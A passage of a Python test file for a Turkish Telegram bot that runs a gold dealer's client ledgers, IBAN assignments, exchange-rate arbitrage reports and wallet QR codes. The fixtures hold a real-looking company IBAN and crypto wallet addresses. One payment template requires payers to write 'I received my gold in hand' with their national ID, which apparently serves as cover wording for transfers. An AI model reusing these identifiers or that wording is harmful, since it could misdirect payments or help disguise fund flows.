            ["No", "Grup", "Devir", "Kasa", "Odenen", "Kom", "Kalan"],
            ["1", "SACİD", "0,00", "0,00", "0,00", "0,00", "5.000.000,00"]
        ]
        mock_sh = MagicMock()
        bot.get_spreadsheet = MagicMock(return_value=mock_sh)
        bot.get_active_daily_sheet = MagicMock(return_value=mock_sheet)
        bot.get_harem_dolar_kuru = MagicMock(return_value=(48.15, 48.25))
        bot.get_harem_euro_kuru = MagicMock(return_value=(52.30, 52.45))

        res_portfoy = bot.sirket_portfoy_raporu_impl()
        self.assertIn("PORTFÖY BİLANÇOSU", res_portfoy)
        self.assertIn("5.000.000,00 ₺", res_portfoy)
        self.assertIn("TOPLAM USD", res_portfoy)
        self.assertIn("TOPLAM EUR", res_portfoy)

    def test_iban_sablon_getir(self):
        sablon_metin = (
            "💎 HSY KUYUMCULUK - ÖDEME BİLGİLERİ 💎\n\n"
            "🏦 Hesap Sahibi: HSY KUYUMCULUK OTOMOBİL TEKSTİL İNŞAAT LİMİTED ŞİRKETİ\n"
            "📍EMLAK KATILIM\n"
            "💳 IBAN: TR090021100000091101900003\n\n"
            "⚠️ ÖDEME KURALLARI:\n"
            "📉 MİNİMUM İŞLEM TUTARI: Gerçekleştirilecek ödemelerde alt limit 150.000 TL'dir.\n"
            "📝 AÇIKLAMA ZORUNLULUĞU: Transfer açıklamasına mutlaka T.C. Kimlik Numaranızı ve \"ALTINIMI ELDEN TESLİM ALDIM\" ibaresini yazmanız gerekmektedir.\n"
            "(Örnek: 12345678910 / ALTINIMI ELDEN TESLİM ALDIM)"
        )
        mock_sheet = MagicMock()
        mock_sheet.title = "30.08.2026"
        mock_sheet.get_all_values.return_value = [
            ["No", "Grup", "Devir", "Kasa", "Odenen", "Kom", "Kalan", "", "", "", "", "Hesap 1", "Şablon 1", "Banka 1", "Cari 1", "Hesap 2", "Şablon 2", "Cari 2"],
            ["1", "SACİD", "0", "0", "0", "0", "0", "", "", "", "", "HSY EMLAK 3", sablon_metin, "EMLK", "THY", "ARS EMLAK 1", "ARS SABLON METNI", "BSM"]
        ]
        mock_sh = MagicMock()
        bot.get_spreadsheet = MagicMock(return_value=mock_sh)
        bot.get_active_daily_sheet = MagicMock(return_value=mock_sheet)

        # 1. Doğrudan /HSY EMLAK 3
        res1 = bot.iban_sablon_getir_impl("/HSY EMLAK 3")
        self.assertIn("HSY KUYUMCULUK - ÖDEME BİLGİLERİ", res1)
        self.assertIn("TR090021100000091101900003", res1)
        self.assertIn("EMLAK KATILIM", res1)

        # 2. Küçük harfli /hsy emlak 3
        res2 = bot.iban_sablon_getir_impl("/hsy emlak 3")
        self.assertIn("TR090021100000091101900003", res2)

        # 3. /sablon HSY EMLAK 3
        res3 = bot.iban_sablon_getir_impl("/sablon HSY EMLAK 3")
        self.assertIn("TR090021100000091101900003", res3)

        # 4. Sağ Blok ARS EMLAK 1
        res4 = bot.iban_sablon_getir_impl("/ARS EMLAK 1")
        self.assertIn("ARS SABLON METNI", res4)

        # 5. Bağlı bir gruptan (/HSY EMLAK 3) çağrıldığında otomatik olarak o gruba tahsis etmeli ve Excel'e yazmalı
        import time
        bot.app_state["GRUP_BAGLANTILARI"] = {
            -100123456789: {"grup": "SACİD", "title": "Sacid VIP Finans"}
        }
        bot.app_state["BAGLANTI_CACHE_TIME"] = time.time()
        res5, kb5 = bot.iban_sablon_getir_impl("/HSY EMLAK 3", chat_id=-100123456789)
        self.assertIn("TR090021100000091101900003", res5)
        self.assertIn("SACİD", res5)
        self.assertIn("tahsis edildi", res5)
        self.assertIn("ibanbosta_HSY EMLAK 3", kb5["inline_keyboard"][0][0]["callback_data"])
        mock_sheet.update_cell.assert_called_with(2, 15, "SACİD")

        # 6. Tekrar istendiğinde zaten tahsisli olduğunu belirtmeli
        res6, kb6 = bot.iban_sablon_getir_impl("/HSY EMLAK 3", chat_id=-100123456789)
        self.assertIn("zaten <b>SACİD</b> grubuna tahsisli", res6)
        self.assertIn("ibanbosta_HSY EMLAK 3", kb6["inline_keyboard"][0][0]["callback_data"])

    def test_grup_aktif_ibanlar_raporu_uret(self):
        sablon_metin = "💳 IBAN: TR090021100000091101900003"
        mock_sheet = MagicMock()
        mock_sheet.title = "30.08.2026"
        mock_sheet.get_all_values.return_value = [
            ["No", "Grup", "Devir", "Kasa", "Odenen", "Kom", "Kalan", "", "", "", "", "Hesap 1", "Şablon 1", "Banka 1", "Cari 1", "Hesap 2", "Şablon 2", "Cari 2"],
            ["1", "SACİD", "0", "0", "0", "0", "0", "", "", "", "", "HSY EMLAK 3", sablon_metin, "EMLK", "SACİD", "ARS EMLAK 1", "💳 IBAN: TR110022", "SACİD"],
            ["2", "TİGER", "0", "0", "0", "0", "0", "", "", "", "", "SRGL 1", "💳 IBAN: TR880099", "KUVEYT", "TİGER", "CYL 1", "💳 IBAN: TR7700", ""]
        ]
        mock_sh = MagicMock()
        bot.get_spreadsheet = MagicMock(return_value=mock_sh)
        bot.get_active_daily_sheet = MagicMock(return_value=mock_sheet)

        # 1. SACİD carisi için sorgula: 2 adet hesap bulmalı ve butonlar üretmeli
        metin, klavye = bot.grup_aktif_ibanlar_raporu_uret("SACİD")
        self.assertIn("SACİD GRUBU AKTİF İBAN VERİ ANALİZİ", metin)
        self.assertIn("Toplam Tahsisli Hesap: <b>2 Adet</b>", metin)
        self.assertIn("HSY EMLAK 3", metin)
        self.assertIn("ARS EMLAK 1", metin)
        self.assertTrue(len(klavye["inline_keyboard"]) >= 2)
        self.assertIn("grup_iban_sil_HSY EMLAK 3_SACİD", klavye["inline_keyboard"][0][0]["callback_data"])

        # 2. İBAN Boşa Çıkar / Silme testi (iban_bosalt_direct)
        ok, h_ad, eski_c, s_title = bot.iban_bosalt_direct("HSY EMLAK 3")
        self.assertTrue(ok)
        self.assertEqual(h_ad, "HSY EMLAK 3")
        self.assertEqual(eski_c, "SACİD")
        mock_sheet.update_cell.assert_called_with(2, 15, "")

        # 3. Hesabı olmayan bir grup için sorgula
        metin_bos, klavye_bos = bot.grup_aktif_ibanlar_raporu_uret("DENGE")
        self.assertIn("Bu gruba şu anda tahsis edilmiş aktif bir İBAN bulunmuyor", metin_bos)

    def test_bakiye_risk_raporu_uret(self):
        # Mock active daily sheet with positive, negative, and zero balance groups
        mock_sheet = MagicMock()
        mock_sheet.title = "30.08.2026"
        mock_sheet.get_all_values.return_value = [
            ["No", "Grup", "Devir", "Kasa", "Odenen", "Kom", "Kalan"],
            ["1", "SACİD", "1.000.000,00", "5.000.000,00", "2.000.000,00", "0", "4.000.000,00"],  # +4.000.000
            ["2", "TİGER", "0", "1.000.000,00", "500.000,00", "0", "500.000,00"],                 # +500.000
            ["3", "THY", "0", "100.000,00", "300.000,00", "0", "-200.000,00"],                    # -200.000 (Borç)
            ["4", "BSM", "0", "0", "50.000,00", "0", "-50.000,00"],                                # -50.000 (Borç)
            ["5", "DENGE", "0", "10.000,00", "10.000,00", "0", "0,00"],                            # 0 (Dengede)
            ["43", "GENEL TOPLAM", "1.000.000,00", "6.110.000,00", "2.860.000,00", "0", "4.250.000,00"]
        ]
        mock_sh = MagicMock()
        bot.get_spreadsheet = MagicMock(return_value=mock_sh)
        bot.get_active_daily_sheet = MagicMock(return_value=mock_sheet)

        # 1. Genel / Konsolide Risk Tablosu (/bakiye)
        metin_tumu, klavye_tumu = bot.bakiye_risk_raporu_uret("tumu")
        self.assertIn("KONSOLİDE RİSK & BAKİYE SIRALAMASI", metin_tumu)
        self.assertIn("RİSK & BORÇLU CARİLER", metin_tumu)
        self.assertIn("THY", metin_tumu)
        self.assertIn("POZİTİF KASA LİDERLİĞİ", metin_tumu)
        self.assertIn("SACİD", metin_tumu)
        self.assertIn("TİGER", metin_tumu)
        self.assertIn("Sıfırlanmış / Dengede", metin_tumu)
        self.assertIn("DENGE", metin_tumu)
        self.assertEqual(len(klavye_tumu["inline_keyboard"]), 3)

        # 2. Yalnızca Borçlular (/borclular)
        metin_borc, klavye_borc = bot.bakiye_risk_raporu_uret("borclular")
        self.assertIn("RİSK & BORÇLU CARİLER LİSTESİ", metin_borc)
        self.assertIn("THY", metin_borc)
        self.assertIn("BSM", metin_borc)
        self.assertNotIn("POZİTİF KASA", metin_borc)
        self.assertIn("TOPLAM CARİ AÇIĞI / BORÇ", metin_borc)

        # 3. Yalnızca Pozitif Bakiyeler (/alacaklar)
        metin_poz, klavye_poz = bot.bakiye_risk_raporu_uret("pozitif")
        self.assertIn("POZİTİF KASA & BAKİYE SIRALAMASI", metin_poz)
        self.assertIn("SACİD", metin_poz)
        self.assertIn("TİGER", metin_poz)
        self.assertNotIn("RİSK & BORÇLU CARİLER LİSTESİ", metin_poz)
        self.assertIn("TOPLAM POZİTİF EMANET KASA", metin_poz)

    def test_bakiye_no_debt_case(self):
        # Case where no negative balances exist
        mock_sheet = MagicMock()
        mock_sheet.title = "30.08.2026_no_debt"
        mock_sheet.get_all_values.return_value = [
            ["No", "Grup", "Devir", "Kasa", "Odenen", "Kom", "Kalan"],
            ["1", "SACİD", "0", "1.000.000,00", "200.000,00", "0", "800.000,00"],
            ["43", "GENEL TOPLAM", "0", "1.000.000,00", "200.000,00", "0", "800.000,00"]
        ]
        mock_sh = MagicMock()
        bot.get_spreadsheet = MagicMock(return_value=mock_sh)
        bot.get_active_daily_sheet = MagicMock(return_value=mock_sheet)

        metin_borc, _ = bot.bakiye_risk_raporu_uret("borclular")
        self.assertIn("eksi bakiyede / şirkete borçlu durumda hiçbir cari bulunmuyor", metin_borc)

    def test_process_telegram_update_risk_commands(self):
        mock_sheet = MagicMock()
        mock_sheet.title = "30.08.2026"
        mock_sheet.get_all_values.return_value = [
            ["No", "Grup", "Devir", "Kasa", "Odenen", "Kom", "Kalan"],
            ["1", "SACİD", "0", "1.000.000,00", "0", "0", "1.000.000,00"],
            ["2", "THY", "0", "0", "200.000,00", "0", "-200.000,00"]
        ]
        bot.get_spreadsheet = MagicMock(return_value=MagicMock())
        bot.get_active_daily_sheet = MagicMock(return_value=mock_sheet)
        bot.telegramMesajGonder = MagicMock(return_value={"ok": True})
        bot.telegramMesajDuzenle = MagicMock(return_value={"ok": True})

        # 1. Message /bakiye
        update_bakiye = {
            "message": {
                "chat": {"id": 12345, "title": "Test Group"},
                "from": {"id": bot.KURUCU_ID},
                "text": "/bakiye"
            }
        }
        bot.process_telegram_update(update_bakiye)
        bot.telegramMesajGonder.assert_called()
        last_call_args = bot.telegramMesajGonder.call_args[0]
        self.assertIn("KONSOLİDE RİSK & BAKİYE SIRALAMASI", last_call_args[1])

        # 2. Message /borclular
        update_borc = {
            "message": {
                "chat": {"id": 12345, "title": "Test Group"},
                "from": {"id": bot.KURUCU_ID},
                "text": "/borclular"
            }
        }
        bot.process_telegram_update(update_borc)
        last_call_args = bot.telegramMesajGonder.call_args[0]
        self.assertIn("RİSK & BORÇLU CARİLER LİSTESİ", last_call_args[1])

        # 3. Message /alacaklar
        update_alacak = {
            "message": {
                "chat": {"id": 12345, "title": "Test Group"},
                "from": {"id": bot.KURUCU_ID},
                "text": "/alacaklar"
            }
        }
        bot.process_telegram_update(update_alacak)
        last_call_args = bot.telegramMesajGonder.call_args[0]
        self.assertIn("POZİTİF KASA & BAKİYE SIRALAMASI", last_call_args[1])

        # 4. Callback query risk_borclular
        update_cb = {
            "callback_query": {
                "id": "cb123",
                "chat_instance": "ci123",
                "from": {"id": bot.KURUCU_ID},
                "message": {"chat": {"id": 12345}, "message_id": 999},
                "data": "risk_borclular"
            }
        }
        bot.telegram_api = MagicMock(return_value={"ok": True})
        bot.process_telegram_update(update_cb)
        bot.telegramMesajDuzenle.assert_called()
        duzenle_args = bot.telegramMesajDuzenle.call_args[0]
        self.assertEqual(duzenle_args[1], 999)
        self.assertIn("RİSK & BORÇLU CARİLER LİSTESİ", duzenle_args[2])

    def test_progress_bar_and_typing_action(self):
        # 1. Test dynamic_progress_bar
        self.assertEqual(bot.dynamic_progress_bar(0), "░░░░░░░░░░")
        self.assertEqual(bot.dynamic_progress_bar(50), "█████░░░░░")
        self.assertEqual(bot.dynamic_progress_bar(100), "██████████")

        # 2. Test yukleme_adim_metni_uret categories
        kasa_txt = bot.yukleme_adim_metni_uret("tumGruplarRaporu_impl", 60)
        self.assertIn("Finans & Kasa Analizi", kasa_txt)
        self.assertIn("[██████░░░░] %60", kasa_txt)

        kur_txt = bot.yukleme_adim_metni_uret("kurRaporuUret_impl", 80)
        self.assertIn("Piyasa Kurları & Varlık Taraması", kur_txt)
        self.assertIn("[████████░░] %80", kur_txt)

        iban_txt = bot.yukleme_adim_metni_uret("iban_sablon_getir_impl", 70)
        self.assertIn("İBAN & Banka Sorgulama", iban_txt)
        self.assertIn("[███████░░░] %70", iban_txt)

        genel_txt = bot.yukleme_adim_metni_uret("unknown_task", 100)
        self.assertIn("CFO İşlem Motoru", genel_txt)
        self.assertIn("[██████████] %100", genel_txt)

        # 3. Test typing chat action, parallel animation and loading message auto-deletion
        bot.telegram_api = MagicMock(return_value={"ok": True, "result": {"message_id": 888}})
        bot.telegramMesajGonder = MagicMock(return_value={"ok": True, "result": {"message_id": 888}})
        bot.telegramMesajDuzenle = MagicMock(return_value={"ok": True})
        bot.telegramMesajSil = MagicMock(return_value={"ok": True})
        bot.telegramChatAction = MagicMock(return_value={"ok": True})

        dummy_fn = MagicMock(return_value="İşlem Tamamlandı")
        bot.islemi_analiz_bildirimiyle_yap(12345, dummy_fn, goster_bildirim=True)

        # Verify typing was called
        bot.telegramChatAction.assert_called_with(12345, "typing")
        # Verify initial progress bar was sent
        self.assertTrue(bot.telegramMesajGonder.call_count >= 2)
        sent_loading_text = bot.telegramMesajGonder.call_args_list[0][0][1]
        self.assertIn("%20", sent_loading_text)
        # Verify dummy_fn was executed
        dummy_fn.assert_called_once()
        # Verify temporary loading message was deleted
        bot.telegramMesajSil.assert_called_with(12345, 888)
        # Verify result was sent
        self.assertEqual(bot.telegramMesajGonder.call_args_list[-1][0][1], "İşlem Tamamlandı")

    def test_parallel_market_rates_and_keepalive(self):
        # 1. Mock http_get_json to return simulated data quickly
        def mock_http(url, headers=None):
            if "truncgil" in url:
                return {"USD": {"Buying": "48,20", "Selling": "48,25"}, "EUR": {"Buying": "52,30", "Selling": "52,45"}}
            elif "exchangerate-api" in url:
                return {"rates": {"TRY": 48.10, "EUR": 0.92, "GBP": 0.79}}
            elif "binance" in url:
                return {"lastPrice": "48.35", "highPrice": "48.50", "lowPrice": "48.10", "price": "48.35"}
            elif "paribu" in url:
                return {"USDT_TL": {"last": "48.38", "high24hr": "48.55", "low24hr": "48.15"}}
            elif "btcturk" in url:
                return {"data": [{"last": "48.36", "high": "48.52", "low": "48.12"}]}
            elif "whitebit" in url:
                return {"result": {"last": "48.34", "high": "48.48", "low": "48.08"}}
            elif "okx" in url:
                return {"data": [{"last": "48.37", "high24h": "48.51", "low24h": "48.11"}]}
            return {}

        mock_doviz_html = '''
        <span data-socket-key="23-USD" data-socket-attr="bid">48,0834</span>
        <span data-socket-key="23-USD" data-socket-attr="ask">48,1703</span>
        <td data-socket-key="23-EUR" data-socket-attr="bid">55,6360</td>
        <td data-socket-key="23-EUR" data-socket-attr="ask">55,8700</td>
        '''

        with patch.object(bot, "http_get_json", side_effect=mock_http), patch.object(bot, "http_get_text", return_value=mock_doviz_html):
            # Test parallel fetch & 15s caching
            rates1 = bot.fetch_all_market_rates_parallel(force_refresh=True)
            self.assertIn("harem", rates1)
            self.assertIn("binance", rates1)
            self.assertIn("paribu", rates1)
            self.assertEqual(rates1["binance"]["last"], 48.35)

            # Test harem kur getters from kur.doviz.com
            u_alis, u_satis = bot.get_harem_dolar_kuru()
            self.assertEqual(u_alis, 48.0834)
            self.assertEqual(u_satis, 48.1703)

            e_alis, e_satis = bot.get_harem_euro_kuru()
            self.assertEqual(e_alis, 55.636)
            self.assertEqual(e_satis, 55.87)

            # Test kur report
            kur_txt = bot.kurRaporuUret_impl()
            self.assertIn("HAREM", kur_txt)
            self.assertIn("BİNANCE", kur_txt)
            self.assertIn("PARİBU", kur_txt)

            # Test borsa list
            b_list_txt, ref_kur = bot.get_borsa_kurlari_listesi()
            self.assertIn("BİNANCE", b_list_txt)
            self.assertEqual(ref_kur, 48.35)

            # Test arbitraj report
            arb_txt = bot.arbitraj_raporu_uret_impl("100000")
            self.assertIn("CANLI ARBİTRAJ", arb_txt)
            self.assertIn("1️⃣ Rota", arb_txt)

    def test_cfo_dashboard_and_panel_command(self):
        bot.telegramMesajGonder = MagicMock(return_value={"ok": True})
        bot.telegramMesajDuzenle = MagicMock(return_value={"ok": True})

        mock_sheet = MagicMock()
        mock_sheet.title = "31.08.2026"
        mock_sheet.get_all_values.return_value = [
            ["No", "Grup", "Devir", "Kasa", "Odenen", "Kom", "Kalan"],
            ["1", "SACİD", "1000", "2000", "500", "100", "2400"],
            ["2", "TİGER", "0", "1000", "0", "0", "1000"]
        ]
        bot.get_active_daily_sheet = MagicMock(return_value=mock_sheet)
        bot.get_sheet_values_fast = MagicMock(return_value=mock_sheet.get_all_values.return_value)

        # 1. Test cfo_dashboard_raporu_uret directly
        dash_txt, dash_kb = bot.cfo_dashboard_raporu_uret()
        self.assertIn("CFO CANLI FİNANS & CARİ DASHBOARD", dash_txt)
        self.assertIn("CARİ BAZLI CANLI HAREKET TABLOSU", dash_txt)
        self.assertIn("KONSOLİDE GENEL TOPLAM BİLANÇO", dash_txt)
        self.assertTrue(len(dash_kb["inline_keyboard"]) >= 2)

        # 2. Test /panel command sends Web Dashboard link message
        update_panel = {
            "message": {
                "chat": {"id": 12345, "title": "Test Group"},
                "from": {"id": bot.KURUCU_ID},
                "text": "/panel"
            }
        }
        bot.process_telegram_update(update_panel)
        last_args = bot.telegramMesajGonder.call_args[0]
        self.assertIn("CANLI CFO WEB DASHBOARD", last_args[1])
        self.assertIn("Panel Linki", last_args[1])

        # 3. Test /dashboard command executes in-chat dashboard
        update_dash = {
            "message": {
                "chat": {"id": 12345, "title": "Test Group"},
                "from": {"id": bot.KURUCU_ID},
                "text": "/dashboard"
            }
        }
        bot.process_telegram_update(update_dash)
        last_args = bot.telegramMesajGonder.call_args[0]
        self.assertIn("CFO CANLI FİNANS & CARİ DASHBOARD", last_args[1])

        # 4. Test callback query dashboard_yenile
        update_cb = {
            "callback_query": {
                "id": "cb_dash_1",
                "chat_instance": "ci_dash",
                "from": {"id": bot.KURUCU_ID},
                "message": {"chat": {"id": 12345}, "message_id": 777},
                "data": "dashboard_yenile"
            }
        }
        bot.telegram_api = MagicMock(return_value={"ok": True})
        bot.process_telegram_update(update_cb)
        bot.telegramMesajDuzenle.assert_called()
        self.assertIn("CFO CANLI FİNANS & CARİ DASHBOARD", bot.telegramMesajDuzenle.call_args[0][2])

        # 5. Test callback query mesaj_kapat
        bot.telegramMesajSil = MagicMock(return_value={"ok": True})
        update_close = {
            "callback_query": {
                "id": "cb_close_1",
                "chat_instance": "ci_close",
                "from": {"id": bot.KURUCU_ID},
                "message": {"chat": {"id": 12345}, "message_id": 777},
                "data": "mesaj_kapat"
            }
        }
        bot.process_telegram_update(update_close)
        bot.telegramMesajSil.assert_called_with(12345, 777)

    def test_all_commands_have_close_button(self):
        # Verify that helper automatically appends close button
        res_plain = bot._append_close_button_if_needed(None)
        self.assertEqual(res_plain["inline_keyboard"][-1][0]["callback_data"], "mesaj_kapat")

        custom_kb = {"inline_keyboard": [[{"text": "Btn 1", "callback_data": "custom_1"}]]}
        res_custom = bot._append_close_button_if_needed(custom_kb)
        self.assertEqual(len(res_custom["inline_keyboard"]), 2)
        self.assertEqual(res_custom["inline_keyboard"][-1][0]["callback_data"], "mesaj_kapat")

        # Calling again shouldn't duplicate
        res_double = bot._append_close_button_if_needed(res_custom)
        self.assertEqual(len(res_double["inline_keyboard"]), 2)

    def test_hedef_kpi_raporu(self):
        mock_sheet = MagicMock()
        mock_sheet.title = "31.08.2026"
        mock_sheet.get_all_values.return_value = [
            ["No", "Grup", "Devir", "Kasa", "Odenen", "Kom", "Kalan"],
            ["1", "SACİD", "1000", "20.000.000", "5.000.000", "100", "15.001.000"],
            ["2", "TİGER", "0", "10.000.000", "5.000.000", "0", "5.000.000"]
        ]
        mock_sh = MagicMock()
        bot.get_spreadsheet = MagicMock(return_value=mock_sh)
        bot.get_active_daily_sheet = MagicMock(return_value=mock_sheet)
        bot.get_sheet_values_fast = MagicMock(return_value=mock_sheet.get_all_values.return_value)
        bot.sistemeLogYaz = MagicMock()

        # 1. Hedef güncelleme
        guncel_msg = bot.hedef_kpi_raporu_uret("50.000.000")
        self.assertIn("Yeni Hedef", guncel_msg)
        self.assertEqual(bot.app_state["CIRO_HEDEFI"], 50000000.0)

        # 2. Hedef raporu üretme (Toplam hacim: 20M + 5M + 10M + 5M = 40M)
        # Hedef 50M -> %80 doluluk, 10M kalan
        rapor_msg = bot.hedef_kpi_raporu_uret()
        self.assertIn("GÜNLÜK CİRO & KPI HEDEF TAKİBİ", rapor_msg)
        self.assertIn("%80.0", rapor_msg)
        self.assertIn("40.000.000,00", rapor_msg)
        self.assertIn("10.000.000,00", rapor_msg)

    def test_haftalik_trend_raporu(self):
        mock_sh = MagicMock()
        
        ws1 = MagicMock()
        ws1.title = "31.08.2026"
        ws1.get_all_values.return_value = [
            ["No", "Grup", "Devir", "Kasa", "Odenen", "Kom", "Kalan", "", "Masraf Kalemi", "Masraf Tutarı"],
            ["1", "SACİD", "0", "10.000.000", "2.000.000", "0", "8.000.000", "", "Yemek", "15.000"],
            ["2", "TİGER", "0", "5.000.000", "1.000.000", "0", "4.000.000", "", "", ""]
        ]
        
        ws2 = MagicMock()
        ws2.title = "30.08.2026"
        ws2.get_all_values.return_value = [
            ["No", "Grup", "Devir", "Kasa", "Odenen", "Kom", "Kalan", "", "Masraf Kalemi", "Masraf Tutarı"],
            ["1", "SACİD", "0", "8.000.000", "1.000.000", "0", "7.000.000", "", "Ofis", "25.000"],
            ["2", "BSM", "0", "3.000.000", "1.000.000", "0", "2.000.000", "", "", ""]
        ]

        mock_sh.worksheets.return_value = [ws1, ws2]
        bot.get_spreadsheet = MagicMock(return_value=mock_sh)

        trend_msg = bot.haftalik_trend_raporu_uret(gun_sayisi=7)
        self.assertIn("HAFTALIK FİNANS & CARİ PERFORMANS ANALİZİ", trend_msg)
        self.assertIn("SACİD", trend_msg)
        self.assertIn("TİGER", trend_msg)
        self.assertIn("40.000,00", trend_msg)  # 15.000 + 25.000 masraf

    def test_kur_fark_makas_raporu(self):
        bot.fetch_all_market_rates_parallel = MagicMock(return_value={
            "harem": {"usd": (48.08, 48.17), "eur": (55.60, 55.85)},
            "binance": {"last": 48.35},
            "paribu": {"last": 48.38},
            "btcturk": {"last": 48.34},
            "whitebit": {"last": 48.32},
            "okx": {"last": 48.36}
        })

        msg = bot.kur_fark_makas_raporu_uret("100000")
        self.assertIn("KAPALIÇARŞI (HAREM) & KRİPTO MAKAS TABLOSU", msg)
        self.assertIn("PARİBU", msg)
        self.assertIn("BİNANCE", msg)
        self.assertIn("BTCTÜRK", msg)
        self.assertIn("WHITEBIT", msg)
        self.assertIn("OKX", msg)
        self.assertIn("EN KARLI ARBİTRAJ ROTASI", msg)
        # Paribu has 48.38 - 48.17 = 0.21 spread * 100,000 = 21,000 TL
        self.assertIn("21.000,00", msg)

    def test_cuzdan_qr_uret(self):
        bot.get_tron_balances = MagicMock(return_value=(100.0, 5000.0, 5030.0))
        bot.detect_wallet_entity = MagicMock(return_value="🏦 <b>Resmi Borsa / Kurum:</b> <code>Binance</code>")
        bot.telegramFotoGonder = MagicMock(return_value={"ok": True})
        bot.telegramMesajGonder = MagicMock(return_value={"ok": True})

        # 1. TRON address
        bot.cuzdanQrUret_impl(12345, "/qr TQHuwJh5c4ygbKhfFoGqTZTahjQuJAX3iV")
        bot.telegramFotoGonder.assert_called()
        call_args = bot.telegramFotoGonder.call_args[0]
        self.assertEqual(call_args[0], 12345)
        self.assertIn("api.qrserver.com", call_args[1])
        self.assertIn("TRON (TRC20)", call_args[2])
        self.assertIn("TQHuwJh5c4ygbKhfFoGqTZTahjQuJAX3iV", call_args[2])
        self.assertIn("5,000.00 USDT", call_args[2])
        self.assertIn("Binance", call_args[2])

        # 2. No arg provided -> uses default company wallet
        bot.telegramFotoGonder.reset_mock()
        bot.cuzdanQrUret_impl(12345, "/qr")
        bot.telegramFotoGonder.assert_called()
        call_args = bot.telegramFotoGonder.call_args[0]
        self.assertIn(bot.VARSAYILAN_TRC20_ADRES, call_args[2])

        # 3. EVM address
        bot.telegramFotoGonder.reset_mock()
        bot.cuzdanQrUret_impl(12345, "/qr 0xd8dA6BF26964aF9D7eEd9e03E53415D37aA96045")
        bot.telegramFotoGonder.assert_called()
        call_args = bot.telegramFotoGonder.call_args[0]
        self.assertIn("Ethereum / BSC (EVM)", call_args[2])
        self.assertIn("0xd8dA6BF26964aF9D7eEd9e03E53415D37aA96045", call_args[2])

        # 4. Invalid short address
        bot.telegramMesajGonder.reset_mock()
        bot.cuzdanQrUret_impl(12345, "/qr 123")
        bot.telegramMesajGonder.assert_called()
        call_args_msg = bot.telegramMesajGonder.call_args[0]
        self.assertIn("Hatalı Kullanım", call_args_msg[1])

        # 5. Telegram update dispatch
        bot.telegramFotoGonder.reset_mock()
        update = {
            "message": {
                "chat": {"id": 12345, "title": "Test Group"},
                "from": {"id": bot.KURUCU_ID},
                "text": "/tronqr TQHuwJh5c4ygbKhfFoGqTZTahjQuJAX3iV"
            }
        }
        bot.process_telegram_update(update)
        bot.telegramFotoGonder.assert_called()

    def test_yetkisiz_kullanici_tek_seferlik_uyari(self):
        bot.telegramMesajGonder = MagicMock(return_value={"ok": True})
        bot.telegram_api = MagicMock(return_value={"ok": True})
        unauth_user = 8519086160
        group_id = -100123456

        # 1. First unauthorized attempt (command in group) -> Warning sent
        update_cmd_1 = {
            "message": {
                "chat": {"id": group_id, "title": "Test Group"},
                "from": {"id": unauth_user},
                "text": "/grupbagla SACİD"
            }
        }
        bot.process_telegram_update(update_cmd_1)
        self.assertEqual(bot.telegramMesajGonder.call_count, 1)
        self.assertIn("Erişim Reddedildi", bot.telegramMesajGonder.call_args[0][1])

        # 2. Second unauthorized attempt in the same group (different command) -> Suppressed (Silent)
        bot.telegramMesajGonder.reset_mock()
        update_cmd_2 = {
            "message": {
                "chat": {"id": group_id, "title": "Test Group"},
                "from": {"id": unauth_user},
                "text": "/start"
            }
        }
        bot.process_telegram_update(update_cmd_2)
        bot.telegramMesajGonder.assert_not_called()

        # 3. Third unauthorized attempt (clicking an inline button in the same group) -> Suppressed
        update_cb = {
            "callback_query": {
                "id": "cb_unauth_1",
                "chat_instance": "ci_unauth",
                "from": {"id": unauth_user},
                "message": {"chat": {"id": group_id}, "message_id": 100},
                "data": "dashboard_yenile"
            }
        }
        bot.process_telegram_update(update_cb)
        bot.telegramMesajGonder.assert_not_called()

        # 4. Same unauthorized user writes /kasa in a DIFFERENT chat (e.g. private chat) -> Warned once in that chat
        private_chat_id = unauth_user
        update_private = {
            "message": {
                "chat": {"id": private_chat_id, "title": ""},
                "from": {"id": unauth_user},
                "text": "/kasa"
            }
        }
        bot.process_telegram_update(update_private)
        self.assertEqual(bot.telegramMesajGonder.call_count, 1)
        self.assertIn("Erişim Reddedildi", bot.telegramMesajGonder.call_args[0][1])

        # 5. Subsequent message in private chat -> Suppressed
        bot.telegramMesajGonder.reset_mock()
        bot.process_telegram_update(update_private)
        bot.telegramMesajGonder.assert_not_called()

        # 6. Unauthorized user writes /kasa in a connected group (after cache reset)
        bot._yetkisiz_uyarilanlar.clear()
        bot.app_state["GRUP_BAGLANTILARI"] = {group_id: {"grup": "BSM", "title": "BSM Grubu"}}
        bot.app_state["BAGLANTI_CACHE_TIME"] = bot.time.time()
        bot.telegramMesajGonder.reset_mock()

        update_group_kasa = {
            "message": {
                "chat": {"id": group_id, "title": "BSM Grubu"},
                "from": {"id": unauth_user},
                "text": "/kasa"
            }
        }
        bot.process_telegram_update(update_group_kasa)
        self.assertEqual(bot.telegramMesajGonder.call_count, 1)
        msg_sent = bot.telegramMesajGonder.call_args[0][1]
        self.assertIn("Erişim Reddedildi", msg_sent)
        self.assertNotIn("GÜNCEL KASA ANALİZİ", msg_sent)

        # Subsequent /kasa by unauthorized user in that group is completely silent
        bot.telegramMesajGonder.reset_mock()
        bot.process_telegram_update(update_group_kasa)
        bot.telegramMesajGonder.assert_not_called()
        bot.telegramMesajGonder.assert_not_called()

    def test_toplu_duyuru_sistemi(self):
        bot.telegramMesajGonder = MagicMock(return_value={"ok": True})
        bot.telegramMesajDuzenle = MagicMock(return_value={"ok": True})
        bot.telegram_api = MagicMock(return_value={"ok": True})
        
        # 1. Eksik metin ile duyuru komutu
        res_eksik, kb_eksik = bot.toplu_duyuru_hazirla_paneli("/duyuru", bot.KURUCU_ID)
        self.assertIn("Eksik Duyuru Metni", res_eksik)
        self.assertIsNone(kb_eksik)

        # 2. Hiç bağlı grup yokken duyuru komutu
        bot.app_state["GRUP_BAGLANTILARI"] = {}
        bot.app_state["BAGLANTI_CACHE_TIME"] = bot.time.time()
        mock_sh = MagicMock()
        mock_ws = MagicMock()
        mock_ws.get_all_values.return_value = [["Chat ID", "Grup Adı", "Telegram Grup Başlığı", "Ekleyen ID", "Tarih"]]
        mock_sh.worksheet.return_value = mock_ws
        mock_sh.title = "02.09.2026"
        bot.get_spreadsheet = MagicMock(return_value=mock_sh)
        bot.get_active_daily_sheet = MagicMock(return_value=mock_ws)
        bot.get_sheet_values_fast = MagicMock(return_value=mock_ws.get_all_values.return_value)

        res_bos, _ = bot.toplu_duyuru_hazirla_paneli("/duyuru Test Duyurusu", bot.KURUCU_ID)
        self.assertIn("Bağlı Grup Bulunamadı", res_bos)

